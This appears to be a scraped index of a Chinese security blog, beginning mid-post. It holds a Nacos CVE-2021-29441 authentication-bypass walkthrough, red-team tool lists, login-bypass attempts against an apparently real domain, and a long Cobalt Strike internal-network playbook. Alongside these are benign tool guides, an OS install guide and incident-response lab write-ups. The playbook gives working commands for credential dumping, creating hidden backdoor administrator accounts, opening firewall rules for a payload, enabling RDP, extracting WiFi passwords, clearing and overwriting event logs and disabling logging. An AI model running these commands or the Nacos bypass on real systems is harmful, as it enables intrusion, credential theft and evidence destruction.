Nacos下载地址(github):\n1 https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 Windows搭建：\n进入github下载地址后下载版本： 1 nacos-server-2.0.0-ALPHA.1.zip 解压出来后进入bin目录： 1 D:\\TargetDrone\\nacos-server-2.0.0-ALPHA.1\\nacos-server-2.0.0-ALPHA.1\\nacos\\bin 输入在当前文件夹下使用打开cmd窗口，输入命令： 1 .\\startup.cmd -m standalone 然后访问网站： 1 2 http://192.168.31.134:8848/nacos/ 192.168.31.134：自己的内网IP地址 5. 默认账号密码\n1 nacos/nacos 即可。\n4. 漏洞复现 漏洞路径 1 http: your-ip:8848/nacos/v1/auth/users?pageNo=1\u0026amp;pageSize=1 2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问\n1 http: your-ip:8848/nacos/v1/auth/users PSOT传参：\n1 username=test1\u0026amp;password=test1 UA 头：\n1 Nacos-Server 发送POST请求，返回码200，创建⽤户成功~！\n返回Nacos登录界面：\n使用账号/密码：\n1 test1/test1 关闭环境：\n1 ./shutdown.sh 5. 漏洞分析 Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。\n正因为这样，所以当我们UA恶意改为Nacos-Server的时候，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。\n这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析\n关键代码在该⽂件下:\n1 2 /nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise Filter.java TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。\n就是很简单的⼀个对于UA的⼀个判断逻辑\n这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。\n6. 漏洞修复 若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/15.webp","permalink":"http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","title":"【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞"},{"content":"0x00 前置知识 1. 平台语法 1 2 3 4 5 hunter语法： app.name=\u0026#34;Nacos\u0026#34; fofa语法： title=\u0026#34;nacos\u0026#34; app=\u0026#34;nacos\u0026#34; 端口：port=\u0026ldquo;8848\u0026rdquo;\n2. 信息收集 资产少的情况下：\n如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等\n1 https://github.com/Tsojan/TsojanScan 资产多的情况下：\n那我们就直接使用指纹识别工具EHole_magic\n1 https://comm.pgpsec.cn/54.html 可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）\n批量漏洞检测工具：\nNacosExploit\n1 https://github.com/h0ny/NacosExploit 漏洞检测：\n3. 漏洞利用点 Nacos 默认帐户名密码：\n1 nacos/nacos 0x01 工具 反序列化漏洞利⽤⼯具\n1 https://github.com/c0olw/NacosRce/releases/tag/v0.5 哥斯拉nacos后渗透插件\n1 https://github.com/pap1rman/postnacos 综合利⽤,且gui版本\n1 https://github.com/charonlight/NacosExploitGUI ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/10.webp","permalink":"http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/","title":"【Nacos】Nacos红队打点方法"},{"content":"开局 首先先拿到一个站点：\n1 2 3 4 5 whjwcm.cn 通过fofa，鹰图等等找资产： domain=\u0026#34;whjwcm.cn\u0026#34; 找到一个图文盒子后台登录页面： https://wss.whjwcm.cn 这时候发现#号：\n1 2 https://wss.whjwcm.cn/manage/#/login?redirect=%2Fplat #/login?redirect=%2Fplat 思路一 0x01 进入后台首先尝试弱口令 一般就是最简单的admin\n0x02 看数据包 修改error为0 通过抓包可以看到返回信息：\n1 2 3 4 5 6 { \u0026#34;error\u0026#34;:1, \u0026#34;msg\u0026#34;:\u0026#34;\\u7528\\u6237\\u540d\\u6216\\u5bc6\\u7801\\u4e0d\\u6b63\\u786e\u0026#34;, \u0026#34;data\u0026#34;:\u0026#34;\u0026#34; } 一共三个参数，都可以试一下： 接触该请求，拦截一下相应信息对error进行修改。\n这里可以看到：error和data数据都可以进行修改，然后进行测试。\n发现进入了/admin/user/info，但Cookie认证是一个未知的，这里可以看出已经没什么用了。\n修改error为200 这里可以将error修改为200，试一下是否可以绕过。\n发现还是不行，这里思路也没了。\ndata进行测试 尝试再data参数中添加一下值，看一下是否可以绕过，\n发现还是不行:\n这时候就可以看一下js文件了，是否有关于这两个参数的代码逻辑问题。\njs文件查找参数 这里看出从js文件中找到了一个data对应的参数值，也是可以进行尝试的。\n但经过测试还是不行，但也是一个思路，后续遇到了可以进行尝试。\n丢弃req数据包 通过劫持req的数据包，丢弃掉，有的时候也可以卡进去，但是这里发现，并不行，这时候这种思路也不行了。\n总结 1 这时候再尝试逻辑漏洞就不现实了，现在这种带#的这种漏洞就不多了。 思路二 如果遇到Cookie:admin-token=未知\n如果遇到一个后台登录页面，抓包发现一个error返回参数为1，然后修改参数0，进行尝试发送后，遇到返回数据中有Cookie:admin-token=未知后，我们的思路是：\n找小程序的token/Cookie，抓取过去进行尝试 找其他系统的弱口令进行尝试修改。 ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/12.webp","permalink":"http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/","title":"【Web攻防】常见Web攻防登录框打法-01"},{"content":"1. 下载地址： 1 https://github.com/shmilylty/OneForAll 2. 使用： 首先把requirements.txt下载下来。\n1 pip install -r .\\requirements.txt 然后直接使用即可\n1 python.exe .\\oneforall.py --target xiyoupark.com run 结果会导出到results文件夹下。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/4.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7oneforall%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"【工具】OneForAll子域名收集工具的使用"},{"content":"部署安装网址： 1 https://blog.csdn.net/weixin_45950429/article/details/107069404 下载地址： 1 2 3 通过网盘分享的文件：WindowsServer 2003.iso 链接: https://pan.baidu.com/s/1_VmXyNxI5kyouSAMjMl5wQ 提取码: 1234 --来自百度网盘超级会员v2的分享 步骤一： 打开VMware,点击我的主页，点击创建新的虚拟机：\n这里选择稍后安装操作系统，然后点击“下一步”\n客户机操作系统选择“Microsoft Windows(W)\u0026quot;，版本的话，你下载的是什么版本你就安装什么版本，我最前面发的是Windows Server 2003 Standard Edition版本的额，也就是32位的。然后点击”下一步”\n虚拟机名称，我这里就默认了，位置一定要自己选择，把它放在内存空间充足的磁盘。\n这里你可以默认40GB，我避免要做的东西多，所以设了“60GB”，下面选择“将虚拟磁盘拆分成多个文件（M），然后点击下一步\n点击自定义硬件，里面的打印机极少用，可以选择移除，然后点击CD，浏览放入映像文件\n点击关闭之后会自动回到这页，点击“完成”\n完成之后就会生成一个虚拟机\n步骤二： 放入镜像之后的安装过程\n点击“开启此虚拟机\u0026quot;,随后就会进入这个页面，开始等待\n点击\u0026quot;Enter\u0026quot;键进行安装，再等待\n点击选择”用NTFS文件系统格式化磁盘分区（快），随后点击\u0026quot;Enter\u0026quot;键继续\n安装格式化，等待\n等待\n出现这个画面，点击“下一步”\n点击我接受这个协议，点击“下一步”\n继续等待，出现这个画面，点击“下一步”，自定义输入名称，点击“下一步”\n这里服务器修改为“500”，然后点击“下一步”\n一定记得设置自己记得住的密码，等一下安装好后开机需要使用\n默认点击下一步，等待\n出现这个画面，点击“典型设置”，点击“下一步”\n选择“不，此计算机不在网络上，或者再没有域的网络上，把此计算机作为下面工作组的一个成员（W)\u0026quot;, 点击”下一步“\n步骤三： 出现这个画面时，点击\u0026quot;完成”，随后点击“是”\n“x\u0026quot;掉\n在 开始–我的电脑–属性-自动更新–点击关闭自动更新(T)\n完成 你可以在桌面点击右键–属性–设置–修改分辨率即可修改屏幕大小\n结束完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/5.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7windows-server-2003%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/","title":"【工具】windows server 2003安装部署"},{"content":"0x01 查看端口状态 命令:\n1 netstat -ano 连接状态有一下几种\nLISTENING：表示监听 ，表示这个端口处于开放状态， 可以提供服务 ESTABLISHED\u0026quot;：表示是对方与你已经连接 正在通信交换数据 CLOSING：表示关闭的 表示端口人为或者防火墙使其关闭(也许服务被卸载) TIME WAIT ：表示正在等待连接 就是你正在向该端口发送请求连接状态\n通过netstat查看网络连接，每条连接后面都有一个PID号，根据PID号可以定位出是哪个进程在监听这个端口 直接查看程序与外部地址的已建立的连接情况 命令:\n1 netstat -b 显示在创建每个连接或侦听端口时涉及的可执行程序，需要管理员权限，这条程序对于查找可疑程序非常有帮助\n或者我们先通过查看网络连接状态，查看pid再通过PID定位程序\n查看已建立的连接 通过如下命令我们优先查找已建立的连接，看是否存在可疑的连接\n1 netstat -ano|findstr \u0026#34;ES\u0026#34; 如下，我们发现一条可疑tcp连接，本机与一个外部的地址的一个特殊端口已经建立了连接，pid号为5840。（我们要着重观察本地是否与外部地址的特殊端口进行连接）\n0x02 根据PID定位进程 命令:\n1 tasklist tasklist ：显示运行在本地或远程计算机上的所有进程。如下图显示了进程对应的PID号\nPID定位进程 上面我们发现了一个可疑的TCP连接，pid号为5840，现在通过这pid定位程序\n1 tasklist | findstr \u0026#34;5840\u0026#34; 如下可知，5840对一个的程序为payload2.exe\n获取进程的全路径 命令:\n1 wmic process | findstr \u0026#34;payload2.exe\u0026#34; 如下，显示了程序的全路径\n或者通过任务管理器找到该进程，再打开进程所在路径\n杀死进程 1 taskkill /f /pid pid号 # /f为强制的意思 注：以上可疑程序的payload为MSF的payload。CS的payload通过上述方式并不能查看到，可知CS的payload隐蔽性还是很高的。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/6.webp","permalink":"http://localhost:1313/p/%E8%93%9D%E9%98%9Fwindows-%E7%AB%AF%E5%8F%A3%E6%8E%92%E6%9F%A5%E6%A1%88%E4%BE%8B/","title":"【蓝队】windows 端口排查案例"},{"content":"0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？\u0026ndash;主机身份与特权边界确认。\n这是哪？\u0026ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？\u0026ndash;对目前机器所处伪造区域的判断。\n谁在哪？\u0026ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n0x01 要收集的信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 操作系统 当权用户权限 内网IP段（网卡信息） 杀毒软件（AV） 端口开放情况 系统补丁 网络状态 共享文件夹 远程信息 服务信息 软件列表 计划任务 启动项 系统日志 防火墙规则 网络代理信息 内网OA办公系统 邮件服务器 网络监控系统 财务应用系统 核心产品源码（SVN/Git 服务器） 管理员密码 浏览器密码 cookie 无线密码 数据库密码 VPN历史密码 Teamview 历史密码 其他用户 session 3389 连接记录 IPC$ 连接记录 各用户回收站信息 用户列表 host 文件 DNS 缓存信息 补丁信息 端口信息 账户密码策略 账号锁定策略 Web 服务器配置文件 Web 服务器日志 ...... 0x02 Windows信息收集 1. 主机信息收集 查看当前用户以及当前用户所在组，所拥有的权限。\n1 shell whoami /all 2. 网卡和IP信息收集 查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息\n1 shell ipconfig /all 可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：\n3. 查看系统详情信息 可以查看网卡，系统，补丁信息\n1 shell systeminfo 我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。\n1 http://bypass.tidesec.com/exp/ 直接复制粘贴过来即可\n4. 查看操作系统和版本信息 1 2 3 4 英文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS Name\u0026#34; /C:\u0026#34;OS Version\u0026#34; 中文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS 名称\u0026#34; /C:\u0026#34;OS 版本\u0026#34; 5. 查看系统体系结构 检查系统架构（AMD64或者x86）-\u0026gt;影响后续工具选择\n1 shell echo %PROCESSOR_ARCHITECTURE% 6. 主机路由信息 可以查看网络目标，都是主机可以直接访问到的机器\n1 shell route print 7. ARP缓存信息 1 shell arp -a 8. DNS缓存信息 1 shell ipconfig /displaydns 9. Host文件信息 1 shell type C:\\windows\\System32\\drivers\\etc\\hosts 10. 端口连接信息 可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。\n1 shell netstat -ano 11. 会话连接 可以查看主机与客户机之间的会话连接\n1 shell net session 12. 查看当前保存的登录凭证，也能看到通的ip 1 shell cmdkey /l 13. 查看当前主机开启的共享列表 1 shell net share 14. 远程相关信息 1 2 3 4 相关链接： http://bypass.tidesec.com/bycms 命令： shell tasklist 15. 查看当前主机与网络中的其他主机建立的共享链接 1 shell net use 16. 查看主机进程信息 1 shell wmic process get Name,ProcessId,ExecutablePath 可以查看主机进程信息，并作出过滤进程路径，名称和pid。\n17. 指定查看路径信息 1 shell wmic process where Name=\u0026#34;有道云笔记.exe\u0026#34; get ExecutablePath 18. 查看补丁信息 1 shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn 19. 查看安装应用信息 1 shell wmic product get Caption,Version PS：在win10中，输入wmic /?会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用\npowershell中可代替该命令的是：Get-WinObject：\n1 Get-WinObject -class win32_product | Select-object -property name,version 20. 查询本机服务 1 shell wmic server list brief 21. 查询目标主机上的杀毒软件 1 2 查询进程：shell tasklist， 或者：shell wmic process list brief 常见的杀软进程：\n进程名 软件 360sd.exe 360杀毒 360tray.exe 360实时保护 ZhuDongFangYu.exe 360主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.exe 卡巴斯基 avhuard.exe 小红伞 bdagent.exe BitDefender 1 shell wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed 主动防御软件的安装路径\n1 shell wmic /namespace:\\\\root\\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe 22. 查看已启动的程序信息 1 shell wmic startup get command,caption 23. 查看计划任务 1 shell schtasks /query /fo LISR /v 24. 查看主机的开机时间 1 shell net statistics workstation 0x04 探测网段存活 高速内网扫描\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i \u0026#34;ttl= \u0026#34; 随机延迟+长超时\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 500 192.168.12.%i \u0026amp;\u0026amp; timeout /t 1 \u0026gt;null | find /i \u0026#34;ttl= \u0026#34; 这里看好有没有杀软edr再用，不然就是自首，除非你能二开工具。\n1. 利用betbios快速探测内网 工具：Nbtscan\n1 https://github.com/lifenjoiner/nbtscan 使用cs可以直接上传该脚本。\n1 shell nbscan.exe 10.10.20.0/24 2. 通过arp扫描完整探测内网 下载地址：\n1 https://github.com/QbsuranAlang/arp-scan-windows- 命令:\n1 shell arp.exe -t 10.10.20.0/24 3. 通过ARPScan脚本 下载地址：\n1 2 3 4 https://github.com/Hackplayers/Empire-mod-Hackplayers/tree/master 通过ARP协议进行扫描。 脚本名称：Invoke-ARPScan.ps1 命令：\n1 2 powershell-import powershell Invoke-ARPScan -CIDR 10.10.20.0/24 上传上去：\n执行该命令即可：\n0x05 针对⽂件内容的信息搜集 当对内⽹束⼿⽆策的时候，⼊⼝机器上⾯说不定藏着突破⼝，翻找本地的⽂件和建⽴的⽹络连接就是⼿法\n这⾥也提供⼀个⽂件内容敏感词的字典，需要可以⾃⼰去整理，如下:\n1 2 3 4 5 6 7 8 jdbc: user= password= key= ssh- ldap: mysqli_connect sk- 0x06 配置信息收集 1. web信息 1 run netstat -ano 2. 文档信息 1 2 shell dir /a /s /b c:\\*.xls shell dir /a /s /b c:\\*.doc 3. 查看最近打开的文档 1 shell dir %APPDATA%\\Microsoft\\Windows\\Recent 4. 查看微信信息 1 shell dir /s /b c:\\\u0026#34;WeChat Files\u0026#34; 0x07 网络资产搜集 1. 网络各种配置文件 通常再行动中，入口点都在泛OA，致OA，通OA，用NC等等。\n用NC解密：\n1 2 下载地址： https://github.com/1amfine2333/ncDecode 致OA解密：\n1 2 下载地址： https://github.com/m4yfly/OA-Seeyou 这些常见系统的配置文件地址要记住，如果是其他入口就多找找.config文件\n常见中间件及其配置目录：\n默认安装：\n中间件 目录1 目录2 MySQL C:\\ProgarmData\\MySQL\\MySQL Server C:\\Progarm Files\\MySQL\\MySQL Server SQL Server C:\\Progarm Files\\Miscrosoft SQL Server\\ Oracle Database C:\\app\\oracle\\product PostgreSQL C:\\Progarm Files\\PostgreSQL Redis C:\\Progarm Files\\Redis Apache C:\\Progarm Files\\Apache Group C:\\Progarm Files（x86）\\Apache Nginx C:\\nginx\\conf C:\\Progarm Files\\Nginx\\conf Tomacat C:\\Progarm Files\\Apache 1 2 3 4 C:\\Users\\XXX\\Desktop //用户桌面内容 C:\\Users\\XXX\\Dowloads //用户下载内容 C:\\Users\\XXX\\Documents //用户文档内容 C:\\Users\\XXX\\AppData\\Local //用户软件信息【仅个人安装选项】 0x08 内网工具 1. fscan 1 2 下载地址： https://github.com/shadow1ng/fscan 命令：\n1 2 3 fscan -h 10.10.20.0/24 -np -no -p 445,3389 -np on ping -pn 21指定不要扫描ftp端口，因为容易被查到 可以改名使用：\n1 2 最好改一下名字： mysql.exe -i 10.10.20.0/24 -np -m netbios ms17010扫描:\n1 mysql.exe -i 10.10.20.0/24 -np -m ms17010 常见端口扫描：\n1 mysql.exe -i 10.10.20.0/24 -np -p 22,2222,3389,1433,3306,1521,5432,6379 2. Kscan-轻量化全方位扫描器 1 2 下载地址 https://github.com/lcvvvv/kscan 3. dismap 1 2 下载地址： https://github.com/zhzyker/dismap 原则就是：\n安静 不被发现 尽量用正常的协议 尽量用改造过的工具 0x09 密码凭证收集 1. 主机密码 1 shell logonpasswords 1 shell hashdump dump lsass进程中的hash(巨龙拉东插件)\n1 2 下载地址： https://github.com/k8gege/Ladon 0x10 用户操作相关 1. 当前用户 1 2 3 shell whoami 一般用这个： shell echo %username% 2. 收集用户信息 查看⽤户名，查看⽤户信息\n1 2 net user net user ⽤户名 3. 在线⽤户 1 shell query user 4. 查看域管 1 shell net localgroup administrators 5. 激活Guest 1 2 3 4 shell net user guest /active:yes shell net user guest P@ssw0rd123 shell net localgroup administrators guest /add shell net localgroup administrators 6. 激活administrator 1 2 shell net user Administrator /active:yes shell net user Administrator P@ssw0rd123 7. 创建⽤户 1 2 shell net user ⽤户名 密码 /add #添加⽤户 shell net localgroup administrators ⽤户名 /add #将⽤户加到管理组 8. 创建后⻔⽤户 1 2 3 shell net user test$ P@ssw0rd123 /add shell net localgroup administrators test$ /add shell net localgroup administrators 0x11 查看防⽕墙相关 1 netsh firewall show config 关闭防⽕墙 1 2 netsh firewall set opmode disable //Windows Server 2003 系统及之前的版本 netsh advfirewall set allprofiles state off //Windows Server 2003 系统及之后的版本 ⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可\n利⽤允许的⼊站端⼝:\n查看已放⾏端⼝:\n1 shell netsh firewall show portopening 根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：\n添加防⽕墙规则:\n1 2 3 4 5 # 放⾏7001端⼝的⼊站流量（伪装为WebLogic） netsh advfirewall firewall add rule name=\u0026#34;WebLogic_Service\u0026#34; dir=in protocol=TCP localport=7001 action=allow # 放⾏CS⽊⻢进程路径（可选） netsh advfirewall firewall add rule name=\u0026#34;Java_Update\u0026#34; dir=in program=\u0026#34;C:\\Windows\\Temp\\payload.exe\u0026#34; action=allow 利⽤ ICMP 协议\n1 https://github.com/krabelize/icmpdoor DNS隧道\n1 https://github.com/iagox86/dnscat2 0x12 RDP操作相关 查看RDP端⼝ 1 shell reg query \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v PortNumber 为16进制数0xd3d，转换为10进制就是3389\n开放RDP服务 1 shell reg add \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\control\\Terminal Server\u0026#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f 开放RDP端⼝ 1 shell netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow 离线破解RDP连接密码 查看是否存在凭证：\n1 shell dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 获取WiFi密码 查看连接过的Wifi名称：\n1 netsh wlan show profiles 如果乱码可以下载下来看\n1 shell netsh wlan show profiles \u0026gt; wlan.txt 查看指定Wifi的密码：\n1 netsh wlan show profile name=\u0026#34;WIFI名称\u0026#34; key=clear 查看代理 1 shell reg query \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\u0026#34; 0x13 ⽇志痕迹相关 清除事件⽇志 1 2 3 4 5 6 7 8 9 wevtutil cl \u0026#34;Windows PowerShell\u0026#34; wevtutil cl \u0026#34;Security\u0026#34; wevtutil cl \u0026#34;System\u0026#34; wevtutil cl \u0026#34;Application\u0026#34; Security：登录/特权操作记录 Windows PowerShell：PS执⾏历史 System：系统服务/驱动事件 Application：应⽤程序事件 停⽌⽇志相关服务 1 2 3 4 5 6 阻⽌新⽇志⽣成 禁⽤事件转发功能 中断⽇志记录链 sc stop Schedule sc stop wecsvc sc stop eventlog 永久禁⽤⽇志服务 1 sc config EventLog start= disabled ⽇志⽂件覆盖 1 2 3 4 5 # 物理覆盖⽇志⽂件 cipher /w:C:\\Windows\\System32\\winevt\\Logs\\Security.evtx 使⽤cipher⼯具进⾏3次覆盖写⼊ 防⽌⽂件恢复⼯具提取⽇志 0x13 CS插件 OLa 下载地址：\n1 https://github.com/d3ckx1/OLa/tree/main cs2插件，直接可以在cs2中使用：\ntaowu 下载地址：\n1 https://github.com/Mr-xn/taowu-cobalt-strike cs2插件\nLSTAR - Aggressor 下载地址：\n1 https://github.com/lintstar/LSTAR/ cs插件\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/13.webp","permalink":"http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"【内网攻防】Windows工作组信息收集"},{"content":"简介 题目来源公众号 vulntarget\n1 https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 任务环境说明：\nwindows账密：workstation/admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到php后缀日志。\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} 完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/7.webp","permalink":"http://localhost:1313/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/","title":"【应急响应靶场】vulntarget-j-01"},{"content":"前景需要 1 2 3 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ 1. 黑客的IP地址 2. 遗留下的三个flag 虚拟机账号/密码\n1 2 账号/密码：defend/defend 账号/密码：root/defend 1. 黑客的IP地址 1 2 3 查看日志文件,Linux查看/var/log/wtmp文件查看可疑IP登陆 last -f /var/log/wtmp 或者直接使用命令 lastlog命令 可以看出192.168.75.129，非常可疑。 1 答案：192.168.75.129 2. 第一个flag 1 2 3 黑客使用root登录了系统，我们可以先去root用户下看看黑客使用了什么命令： 使用命令：history 得到第一个flag：thisismybaby 1 答案：flag{thisismybaby} 3. 第二个flag 1 2 3 4 5 从第一个flag中我们可以看出，黑客对/etc/rc.d/rc.local进行编辑和提升了执行权限 Linux中/etc/rc.d/rc.local 用于添加开机启动命令 我们cd /etc/rc.d/下，使用ls -la ，查看有rc.local，直接用cat rc.local得到第二个flag 1 答案：flag{kfcvme50} 4. 第三个flag 1 我们通过查看log日志，我们发现一个redis日志文件，然后看一下redis日志并没有什么结果，那么我们去看一下redis配置文件（more /etc/redis.conf）就得到第三个flag。 1 答案：flag{P@ssWrd_redis} 全部答案： 1 2 3 4 192.168.75.129 flag{thisismybaby} flag{kfcvme50} flag{P@ssW0rd_redis} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/8.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/","title":"【知攻善防靶场】Linux1"},{"content":"前提须知 1 2 3 4 5 6 7 8 9 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ （1）提交攻击者IP （2）提交攻击者修改的管理员密码(明文) （3）提交第一次Webshell的连接URL （4）提交Webshell连接密码 （5）提交数据包的flag1 （6）提交攻击者使用的后续上传的木马文件名称 （7）提交攻击者隐藏的flag2 （8）提交攻击者隐藏的flag3 虚拟机账号/密码：\n1 2 账号：root 密码：Inch@957821. 1. 提交攻击者IP 方法一： 1 2 首先看一下管理员登录情况，确定一下黑客登录IP 命令：last -f /var/log/wtmp 方法二： 1 2 如果不确定的话，我们可以登录bt面板看一下 这里我看var目录文件时，看到了bt配置文件，那就bt看一下 1 果然安装了宝塔，那就登录一下，因为不知道面板的密码那我们就直接修改一下面板的密码。 然后看一下面板的默认信息，看一下url地址\n1 2 3 4 5 外网面板地址: \u0026lt;https://58.247.126.6:12485/5a2ce72d\u0026gt; 内网面板地址: \u0026lt;https://192.168.198.130:12485/5a2ce72d\u0026gt; username: uysycv5w password: admin123 进行登录。 1 2 我们从bt面板里面看到了他添加了一个网站，我们去看一下他的日志（这里我就不用宝塔面板中的去查看日志了），我们首先去/www/wwwlogs目录下127.0.0.1.log 查看一下日志 使用命令：cat 127.0.0.1.log | gerp 200 1 答案：192.168.20.1 2. 提交攻击者修改的管理员密码(明文) 1 在宝塔面板发现一个phpmyadmin的mysql数据库，进管理看数据，找密码即可。 1 2 3 找到一个x2_user表，密码,这里使用过的是md5进行加密的，不清楚的可以去网上搜一下或者看一下源码，md5加密是不可逆的，但是可以在网上公开的网站进行解密： URL：\u0026lt;https://www.somd5.com/\u0026gt; 答案：Network@2020 1 答案：Network@2020 3. 提交第一次Webshell的连接URL 1 2 查看流量包，可以看出 index.php?user-app-register 1 Webshell的连接：\u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; 4. 提交Webshell连接密码 1 根据题目3可以看出。 1 2 webshell密码是：Network2020 使用蚁剑进行连接。 5. 提交数据包的flag1 1 2 3 4 ls一下，你就会发现默认的文件夹下给了一个流量数据包，下载这个数据包使用wireshark进行分析。 [root@web-server ~]# ls anaconda-ks.cfg wp 数据包1.pcapng 1 首先，过滤一下http报文，可以看到这些报文都是攻击者192.168.20.1在访问Linux主机。 1 先浏览一下过滤出来的报文，发现攻击者访问了/flag1路径，追踪http流。 1 发现了一个第一个flag：flag1{Network@_2020_Hack}，提交判题程序得知正确。 1 答案：flag1{Network@_2020_Hack} 6. 提交攻击者使用的后续上传的木马文件名称 1 查看数据包，可以看出，黑客上传了一个version2.php文件。 1 答案：version2.php 7. 提交攻击者隐藏的flag2 1 根据命令可以看出，黑客进入了127.0.0.1文件夹，并创建了一个隐藏文件夹.api，进入后查看 1 可以看出他编辑了这两个文件，cat看一下。 1 cat alinotify.php,发现flag2。 1 答案：$flag2 = \u0026#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}\u0026#34;; 8. 提交攻击者隐藏的flag3 1 使用命令：history,查看历史使用过的命令可以发现 1 答案：flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} 全部答案： 1 2 3 4 5 6 7 8 192.168.20.1 Network@2020 \u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; Network2020 flag1{Network@_2020_Hack} version2.php 